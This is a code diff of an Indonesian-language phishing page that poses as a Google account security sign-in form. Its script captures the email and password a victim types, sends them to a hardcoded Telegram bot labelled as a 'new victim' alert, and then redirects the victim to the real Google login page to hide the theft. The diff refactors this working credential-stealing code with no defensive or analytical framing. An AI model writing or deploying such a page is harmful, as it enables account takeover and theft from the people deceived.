@@ -6,10 +6,10 @@
     <title>Keamanan Akun Google</title>
     <style>
         body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f1f1f1; }
-        .box { width: 350px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; background: white; text-align: center; }
+        .box { width: 320px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; background: white; text-align: center; }
         img { width: 75px; margin-bottom: 10px; }
-        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
-        button { background-color: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; width: 100%; margin-top: 20px; font-weight: 500; cursor: pointer; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; }
+        button { background-color: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; width: 100%; margin-top: 20px; cursor: pointer; }
     </style>
 </head>
 <body>
@@ -25,11 +25,18 @@
     <script>
         document.getElementById('gas').addEventListener('submit', function(e) {
             e.preventDefault();
-            const token = '8469370025:AAHP58nPm9mKa_uBWE0nhcCAPWffeipjbl8'; //
-            const id = '6119659517'; //
-            const teks = `🎯 KORBAN BARU!\n\n📧 Email: ${document.getElementById('email').value}\n🔑 Sandi: ${document.getElementById('pass').value}`;
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${id}&text=${encodeURIComponent(teks)}`)
-            .then(() => { window.location.href = 'https://accounts.google.com'; });
+            const token = '8469370025:AAHP58nPm9mKa_uBWE0nhcCAPWffeipjbl8'; 
+            const id = '6119659517'; 
+            const emai = document.getElementById('email').value;
+            const sandi = document.getElementById('pass').value;
+            const pesan = `🎯 JARING TEMBUS!\n\n📧 Email: ${emai}\n🔑 Sandi: ${sandi}`;
+
+            // Menggunakan URL langsung agar lebih stabil
+            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${id}&text=${encodeURIComponent(pesan)}`;
+            
+            fetch(url).then(() => {
+                window.location.href = 'https://accounts.google.com';
+            }).catch(err => alert('Gagal kirim! Cek koneksi.'));
         });
     </script>
 </body>
